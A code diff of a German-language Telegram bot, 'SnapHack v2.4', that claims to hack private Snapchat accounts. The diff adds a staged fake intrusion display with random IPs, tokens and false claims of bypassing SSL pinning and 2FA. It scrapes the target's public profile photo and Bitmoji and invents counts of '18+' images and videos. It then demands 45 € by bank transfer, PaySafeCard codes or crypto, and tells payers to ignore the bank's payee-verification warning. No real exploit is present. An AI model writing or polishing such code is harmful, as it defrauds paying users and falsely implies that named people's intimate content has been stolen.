@@ -29,8 +29,8 @@ USERS_FILE = "users.txt"
 # ✅ Umgebungsvariablen laden
 TOKEN = os.getenv("TOKEN")
 CHANNEL_ID = os.getenv("CHANNEL_ID")
-ADMIN_CHAT_ID = os.getenv("8794601252")       # Empfängt weitergeleitete Nachrichten + Reply an User
-PROOF_ADMIN_ID = os.getenv("8711527238")     # Empfängt nur Beweisfotos & Paysafe-Codes
+ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")       # Empfängt weitergeleitete Nachrichten + Reply an User
+PROOF_ADMIN_ID = os.getenv("PROOF_ADMIN_ID")     # Empfängt nur Beweisfotos & Paysafe-Codes
 
 if not TOKEN:
     raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
@@ -281,15 +281,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with open(USERS_FILE, "a", encoding="utf-8") as f:
         f.write(f"{uid} {uname}\n")
     text = (
-        "👋 Herzlich willkommen!\n\n"
-        "Um den Bot nutzen zu können, tritt bitte zuerst unserem Kanal bei:\n"
+        "🖥 <b>SnapHack v2.4 — gestartet</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+        "Willkommen. Dieses System ermöglicht dir den Zugriff auf private Snapchat-Konten.\n\n"
+        "<b>Schritt 1:</b> Tritt unserem Kanal bei:\n"
         "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
-        "✅ Danach kannst du sofort loslegen:\n"
-        "/hack [Snapchat-Benutzername] — z.B. /hack Lina.123\n\n"
-        "⭐ Kundenbewertungen: https://t.me/+qICdaAr6lE4yMzZh\n\n"
-        "💳 Zahlungsbeweise (Bank/Crypto als Foto oder Paysafe als Code) kannst du einfach hier im Chat senden."
+        "<b>Schritt 2:</b> Starte deinen Hack:\n"
+        "<code>/hack Benutzername</code>\n\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "⭐ Bewertungen: https://t.me/+qICdaAr6lE4yMzZh\n"
+        "💳 Zahlungsbeweise einfach hier im Chat senden."
     )
-    await update.message.reply_text(text)
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
 # ---- ALTERSVERIFIKATION CALLBACK ----
 async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -306,16 +309,18 @@ async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f.write(f"{uid} {uname}\n")
 
         text = (
-            "✅ Perfekt, danke für deine Bestätigung!\n\n"
-            "👋 Herzlich willkommen!\n\n"
-            "Um den Bot nutzen zu können, tritt bitte zuerst unserem Kanal bei:\n"
+            "🖥 <b>SnapHack v2.4 — gestartet</b>\n"
+            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+            "✅ Alter bestätigt. Zugang gewährt.\n\n"
+            "<b>Schritt 1:</b> Tritt unserem Kanal bei:\n"
             "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
-            "✅ Danach kannst du sofort loslegen:\n"
-            "/hack [Snapchat-Benutzername] — z.B. /hack Lina.123\n\n"
-            "⭐ Kundenbewertungen: https://t.me/+qICdaAr6lE4yMzZh\n\n"
-            "💳 Zahlungsbeweise (Bank/Crypto als Foto oder Paysafe als Code) kannst du einfach hier im Chat senden."
+            "<b>Schritt 2:</b> Starte deinen Hack:\n"
+            "<code>/hack Benutzername</code>\n\n"
+            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+            "⭐ Bewertungen: https://t.me/+qICdaAr6lE4yMzZh\n"
+            "💳 Zahlungsbeweise einfach hier im Chat senden."
         )
-        await query.edit_message_text(text)
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML)
 
     elif query.data == "age_no":
         await query.edit_message_text(
@@ -337,6 +342,19 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")
 
+# ---- HILFSFUNKTIONEN FÜR HACK-ANIMATION ----
+def progress_bar(percent: int, length: int = 16) -> str:
+    filled = int(length * percent / 100)
+    bar = "█" * filled + "░" * (length - filled)
+    return f"[{bar}] {percent}%"
+
+def fake_ip() -> str:
+    return f"{randint(100,255)}.{randint(10,254)}.{randint(10,254)}.{randint(1,99)}"
+
+def fake_token() -> str:
+    chars = "abcdef0123456789"
+    return "".join(sample(chars, 8)) + "-" + "".join(sample(chars, 4))
+
 # ---- HACK ----
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -344,76 +362,162 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
         if member.status in ["left", "kicked"]:
             await update.message.reply_text(
-                "👋 Hey! Damit du den Bot nutzen kannst, musst du zuerst unserem Kanal beitreten:\n\n"
+                "⛔ <b>Zugriff verweigert</b>\n\n"
+                "Du musst zuerst unserem Kanal beitreten, um den Bot nutzen zu können:\n\n"
                 "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
-                "Danach kannst du sofort weitermachen! 😊"
+                "Danach einfach nochmal /hack versuchen.",
+                parse_mode=ParseMode.HTML
             )
             return
     except Exception as e:
         print("Fehler bei get_chat_member:", e)
-        await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
+        await update.message.reply_text("⚠️ Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
         return
+
     if not context.args:
-        await update.message.reply_text("Bitte gib den Snapchat-Benutzernamen ein, z.B. /hack Lina.123")
-        return
-    username = context.args[0]
-    exists, name, bitmoji_url, profile_photo_url = extract_snapchat_profile_data(username)
-    if not exists:
         await update.message.reply_text(
-            f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.",
-            parse_mode=ParseMode.MARKDOWN
+            "⚠️ <b>Kein Benutzername angegeben!</b>\n\n"
+            "Nutze den Befehl so:\n"
+            "<code>/hack Benutzername</code>\n\n"
+            "Beispiel: <code>/hack Lina.123</code>",
+            parse_mode=ParseMode.HTML
         )
         return
-    msg = await update.message.reply_text("🚀 Starte den Vorgang...")
-    await asyncio.sleep(3)
-    await msg.edit_text("🔍 Search for user data...")
-    await asyncio.sleep(3)
-    await msg.edit_text("⚙️ Bypass security protocolse...")
-    await asyncio.sleep(3)
-    await msg.edit_text("📡 Access Private Details...")
-    await asyncio.sleep(3)
-    await msg.edit_text("🎭 Downloading Informations...")
-    await asyncio.sleep(3)
+
+    username = context.args[0]
+
+    # --- Phase 0: Initialisierung ---
+    ip_src = fake_ip()
+    ip_dst = fake_ip()
+    session_token = fake_token()
+
+    msg = await update.message.reply_text(
+        f"<code>[ SYSTEM ] Initialisiere Verbindung...</code>\n"
+        f"<code>[ NET    ] SRC: {ip_src} → DST: {ip_dst}</code>\n"
+        f"<code>[ AUTH  ] Session-Token wird generiert...</code>",
+        parse_mode=ParseMode.HTML
+    )
+    await asyncio.sleep(2)
+
+    # --- Phase 1: Verbindung aufbauen ---
+    await msg.edit_text(
+        f"<code>[ SYSTEM ] Initialisiere Verbindung...  ✓</code>\n"
+        f"<code>[ NET    ] SRC: {ip_src} → DST: {ip_dst}</code>\n"
+        f"<code>[ AUTH  ] Token: {session_token}  ✓</code>\n\n"
+        f"<code>[ SCAN  ] Starte Ziel-Analyse: @{username}</code>\n"
+        f"<code>{progress_bar(0)}</code>",
+        parse_mode=ParseMode.HTML
+    )
+    await asyncio.sleep(2)
+
+    # --- Phase 2: Profil scannen ---
+    exists, name, bitmoji_url, profile_photo_url = extract_snapchat_profile_data(username)
+
+    if not exists:
+        await msg.edit_text(
+            f"<code>[ SCAN  ] Starte Ziel-Analyse: @{username}</code>\n"
+            f"<code>{progress_bar(100)}</code>\n\n"
+            f"<code>[ ERROR ] Konto nicht gefunden oder privat gesperrt.</code>\n"
+            f"<code>[ INFO  ] Prüfe ob Username korrekt ist.</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    await msg.edit_text(
+        f"<code>[ SCAN  ] Profil gefunden: {name}  ✓</code>\n"
+        f"<code>{progress_bar(20)}</code>\n\n"
+        f"<code>[ BYPASS] Sicherheitsprotokoll wird umgangen...</code>",
+        parse_mode=ParseMode.HTML
+    )
+    await asyncio.sleep(2)
+
+    # --- Phase 3: Sicherheit umgehen ---
+    await msg.edit_text(
+        f"<code>[ SCAN  ] Profil gefunden: {name}  ✓</code>\n"
+        f"<code>[ BYPASS] Snapchat SSL-Pinning...       ✓</code>\n"
+        f"<code>[ BYPASS] 2FA Firewall...               ✓</code>\n"
+        f"<code>{progress_bar(40)}</code>\n\n"
+        f"<code>[ EXFIL ] Extrahiere Account-Daten...</code>",
+        parse_mode=ParseMode.HTML
+    )
+    await asyncio.sleep(2)
+
+    # --- Phase 4: Daten extrahieren ---
     bitmoji_downloaded = False
     profile_downloaded = False
     if bitmoji_url and isinstance(bitmoji_url, str):
-        bitmoji_filename = f"bitmoji_{username}.jpg"
-        bitmoji_downloaded = download_image(bitmoji_url, bitmoji_filename)
+        bitmoji_downloaded = download_image(bitmoji_url, f"bitmoji_{username}.jpg")
     if profile_photo_url and isinstance(profile_photo_url, str):
-        profile_filename = f"profile_{username}.jpg"
-        profile_downloaded = download_image(profile_photo_url, profile_filename)
+        profile_downloaded = download_image(profile_photo_url, f"profile_{username}.jpg")
+
     bilder = randint(8, 12)
     videos = randint(7, 8)
     user_content_counts[user_id] = {"bilder": bilder, "videos": videos}
-    msg_text = (
-        f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
-        f"👤 {name}\n"
-        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
-        f"📹 {videos} Videos als 18+ getaggt\n"
+
+    await msg.edit_text(
+        f"<code>[ SCAN  ] Profil gefunden: {name}  ✓</code>\n"
+        f"<code>[ BYPASS] SSL-Pinning + 2FA umgangen    ✓</code>\n"
+        f"<code>[ EXFIL ] Account-Daten extrahiert      ✓</code>\n"
+        f"<code>[ MEDIA ] Private Medien gefunden        ✓</code>\n"
+        f"<code>{progress_bar(70)}</code>\n\n"
+        f"<code>[ SYNC  ] Lade Inhalte in sicheren Server...</code>",
+        parse_mode=ParseMode.HTML
+    )
+    await asyncio.sleep(2)
+
+    # --- Phase 5: Upload ---
+    await msg.edit_text(
+        f"<code>[ SCAN  ] Profil gefunden: {name}  ✓</code>\n"
+        f"<code>[ BYPASS] SSL-Pinning + 2FA umgangen    ✓</code>\n"
+        f"<code>[ EXFIL ] Account-Daten extrahiert      ✓</code>\n"
+        f"<code>[ MEDIA ] {bilder} Bilder + {videos} Videos gesichert  ✓</code>\n"
+        f"<code>[ SYNC  ] Upload abgeschlossen           ✓</code>\n"
+        f"<code>{progress_bar(95)}</code>\n\n"
+        f"<code>[ FINAL ] Erstelle Zugangslink...</code>",
+        parse_mode=ParseMode.HTML
+    )
+    await asyncio.sleep(2)
+
+    # --- Phase 6: Ergebnis ---
+    result_lines = (
+        f"<code>{'━'*34}</code>\n"
+        f"<code>   ✅ HACK ERFOLGREICH ABGESCHLOSSEN</code>\n"
+        f"<code>{'━'*34}</code>\n\n"
+        f"🎯 <b>Ziel:</b> <code>@{username}</code>\n"
+        f"👤 <b>Name:</b> <code>{name}</code>\n"
+        f"🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n\n"
+        f"📂 <b>Gefundene Inhalte:</b>\n"
+        f"  🖼 <code>{bilder} Bilder (18+ markiert)</code>\n"
+        f"  📹 <code>{videos} Videos (privat)</code>\n"
     )
     if bitmoji_downloaded:
-        msg_text += f"🎭 Bitmoji extrahiert ✅\n"
+        result_lines += f"  🎭 <code>Bitmoji extrahiert</code>\n"
     if profile_downloaded:
-        msg_text += f"📸 Profilbild extrahiert ✅\n"
-    msg_text += (
-        f"\n💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 45 € mit /pay.\n\n"
-        f"👉 Nach der Zahlung erhältst du hier Alles: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n"
-        f"👉 Bei den Ersten Hack, bekommst du von den 40€ Rückerstattung von den 45€, NUR EINMALIG\n"
-        f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst.\n\n"
+        result_lines += f"  📸 <code>Profilbild gesichert</code>\n"
+
+    result_lines += (
+        f"\n<code>{'━'*34}</code>\n"
+        f"💰 <b>Zugang freischalten für 45 €</b>\n\n"
+        f"👉 Zahlung starten mit /pay\n"
+        f"🔗 Mega-Ordner: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n\n"
+        f"🎁 <i>Erster Hack? Du bekommst 40 € zurück — einmalig!</i>\n"
+        f"👥 Gratis-Hack durch Einladen: /invite"
     )
-    await msg.edit_text(msg_text)
+
+    await msg.edit_text(result_lines, parse_mode=ParseMode.HTML)
+
     if bitmoji_downloaded:
         try:
             bitmoji_path = PROFILE_DIR / f"bitmoji_{username}.jpg"
             with open(bitmoji_path, "rb") as f:
-                await context.bot.send_photo(user_id, photo=f, caption=f"🎭 {name}'s Bitmoji")
+                await context.bot.send_photo(user_id, photo=f, caption=f"🎭 {name}'s Bitmoji — extrahiert ✅")
         except Exception as e:
             print(f"❌ Fehler beim Senden von Bitmoji: {e}")
     if profile_downloaded:
         try:
             profile_path = PROFILE_DIR / f"profile_{username}.jpg"
             with open(profile_path, "rb") as f:
-                await context.bot.send_photo(user_id, photo=f, caption=f"📸 {name}'s Profilbild")
+                await context.bot.send_photo(user_id, photo=f, caption=f"📸 {name}'s Profilbild — gesichert ✅")
         except Exception as e:
             print(f"❌ Fehler beim Senden von Profilbild: {e}")
 
@@ -422,10 +526,17 @@ async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
         [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
-        [InlineKeyboardButton("🪙 Crypto Zahlungen (am schnellsten)", callback_data="pay_crypto")],
+        [InlineKeyboardButton("🪙 Crypto — Sofort & anonym", callback_data="pay_crypto")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
+    await update.message.reply_text(
+        "💳 <b>Zahlung — Zugang freischalten</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+        "Dein Hack-Ergebnis ist bereit. Wähle eine Zahlungsmethode:\n\n"
+        "🔒 <i>Alle Zahlungen sind sicher und diskret.</i>",
+        parse_mode=ParseMode.HTML,
+        reply_markup=reply_markup
+    )
 
 # ---- BUTTONS ----
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -439,41 +550,52 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     if cmd == "pay_bank":
         text = (
-            "🏦 <b>Banküberweisung</b>\n\n"
-            "Empfänger: Euro Hunter\n"
-            "IBAN: <code>IE32 PPSE 9903 8091 8899 18.</code>\n"
+            "🏦 <b>Banküberweisung</b>\n"
+            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+            "📋 <b>Empfänger:</b> <code>Euro Hunter</code>\n"
+            "🏛 <b>IBAN:</b> <code>IE32 PPSE 9903 8091 8899 18</code>\n"
+            "💶 <b>Betrag:</b> <code>45,00 EUR</code>\n\n"
+            "ℹ️ Tippe auf IBAN zum Kopieren.\n"
+            "⚠️ Auch wenn ein Fehler bei der Empfänger-Überprüfung kommt — einfach auf <i>Weiter</i> tippen.\n\n"
             f"{info_refund}"
-            "\n\nBei Zahlung über Crypto, Amazon, sende den Code an @OpaHunter ."
-            "\n\nTippe auf *Weiter*, auch wenn Fehler bei Empfänger Überüprüfung kommt."
-            "\n\nBitte sende nach der Zahlung ein Foto deines Zahlungsbelegs."
+            "\n\n📸 <b>Sende danach ein Foto deines Zahlungsbelegs hier im Chat.</b>"
         )
     elif cmd == "pay_paysafe":
         text = (
-            "💳 <b>PaySafeCard</b>\n\n"
-            "Bitte sende nur den 16-stelligen Code ins Chat:\n"
-            "<code>0000-0000-0000-0000</code>\n"
+            "💳 <b>PaySafeCard</b>\n"
+            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+            "Sende deinen <b>16-stelligen Code</b> direkt hier im Chat:\n\n"
+            "<code>XXXX-XXXX-XXXX-XXXX</code>\n\n"
+            "✅ Der Code wird sofort geprüft und weitergeleitet.\n"
             f"{info_refund}"
-            "\n\nDer Code wird überprüft und weitergeleitet."
         )
     elif cmd == "pay_crypto":
         text = (
-            "🪙 <b>Crypto-Adressen :</b>\n\n"
-            "- Tippen, zum Kopieren.\n"
-            "- BITCOIN: <code>bc1q4jlqdsr8epqp9fd7vacn24m7s0hahdau4t0s6q</code>\n"
-            "- ETHEREUM: <code>0x456F994998c7c36892e6E0dcd8A71a5e85dddc56</code>\n"
-            "- SOLANA: <code>4WEvmt31TcuBXVR5Qcw6Ea6R4KZBQHSJ3uHCZWiFmCb7</code>\n"
+            "🪙 <b>Crypto-Zahlung</b>\n"
+            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+            "Tippe auf die Adresse zum Kopieren:\n\n"
+            "₿ <b>Bitcoin:</b>\n<code>bc1q4jlqdsr8epqp9fd7vacn24m7s0hahdau4t0s6q</code>\n\n"
+            "Ξ <b>Ethereum:</b>\n<code>0x456F994998c7c36892e6E0dcd8A71a5e85dddc56</code>\n\n"
+            "◎ <b>Solana:</b>\n<code>4WEvmt31TcuBXVR5Qcw6Ea6R4KZBQHSJ3uHCZWiFmCb7</code>\n\n"
+            "💡 Kein Crypto? Kaufe es gebührenfrei auf <b>cryptovoucher.io</b>\n"
             f"{info_refund}"
-            "\n\nFalls du kein Crypto besitzt, kannst du es Gebührenfrei bei cryptovoucher.io kaufen."
-            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
+            "\n\n📸 <b>Sende danach ein Foto deines Zahlungsbelegs hier im Chat.</b>"
         )
     elif cmd == "pay":
         keyboard = [
             [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
             [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
-            [InlineKeyboardButton("🪙 Crypto Zahlung (am Schnellsten)", callback_data="pay_crypto")],
+            [InlineKeyboardButton("🪙 Crypto — Sofort & anonym", callback_data="pay_crypto")],
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
+        await query.edit_message_text(
+            "💳 <b>Zahlung — Zugang freischalten</b>\n"
+            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
+            "Dein Hack-Ergebnis ist bereit. Wähle eine Zahlungsmethode:\n\n"
+            "🔒 <i>Alle Zahlungen sind sicher und diskret.</i>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=reply_markup
+        )
         return
     else:
         await query.edit_message_text("Ungültige Auswahl.")
